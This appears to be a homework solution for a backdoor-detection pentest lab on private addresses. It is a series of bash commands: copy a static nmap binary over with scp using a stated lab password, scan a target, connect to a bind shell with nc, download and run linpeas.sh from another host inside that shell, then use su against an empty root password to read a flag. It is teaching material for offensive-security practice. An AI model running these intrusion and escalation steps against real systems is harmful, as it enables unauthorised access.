## h 7.1 p
```bash
#Kali:
wget https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz
scp nmap-x64.tar.gz student@192.168.100.107:/home/student

#Homework server:
ssh student@192.168.100.107 #Password: pjatk
tar zxvf nmap-x64.tar.gz
```

## h 7.2 p
```bash
#Run on student@backdoor-detection-homework:
./nmap -p- -n -Pn -sV -vv 192.168.200.157
```

## h 7.3 p
```bash
#On student@backdoor-detection-homework:
nc 192.168.200.157 1234 #Bind shell port found by Nmap in 7.2p
```

## h 7.4 p
```bash
#Kali - copy linpeas.sh if missing on the homework server:
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
scp linpeas.sh student@192.168.100.107:/home/student

#Terminal 1 - student@192.168.100.107:
python3 -m http.server 1234

#Terminal 2 - student@192.168.100.107:
nc 192.168.200.157 1234
#Inside the bind shell (admin):
wget http://192.168.200.107:1234/linpeas.sh
```

## h 7.5 p
```bash
#Inside the bind shell (admin@backdoor-detection-pentest-homework):
bash linpeas.sh
```

## h 7.6 p
```bash
#Inside the bind shell (admin):
su #Root has an empty password (root::0:0 in /etc/passwd)
cat /root/root.txt #Submit the flag on the platform
```
